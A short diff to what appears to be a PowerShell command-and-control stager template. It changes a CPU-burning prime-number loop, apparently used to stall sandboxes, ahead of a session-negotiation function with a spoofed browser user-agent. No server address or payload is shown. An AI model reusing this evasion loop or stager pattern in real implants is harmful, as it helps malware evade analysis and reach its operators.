@@ -10,7 +10,7 @@
 {% include 'http/comms.ps1' %}
 $force=0;
 
-function Perform-PrimeCheck { $maxNumber = 300000; $primes = @(); for ($i = 2; $i -le $maxNumber; $i++) { $isPrime = $true; for ($j = 2; $j -le [math]::Sqrt($i); $j++) { if ($i % $j -eq 0) { $isPrime = $false; break } }; if ($isPrime) { $primes += $i } } };
+function Perform-PrimeCheck { $maxNumber = 567765; $primes = @(); for ($i = 2; $i -le $maxNumber; $i++) { $isPrime = $true; for ($j = 2; $j -le [math]::Sqrt($i); $j++) { if ($i % $j -eq 0) { $isPrime = $false; break } }; if ($isPrime) { $primes += $i } } };
 
 function Start-Negotiate {
     param($s, $SK, $UA = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', $hop)
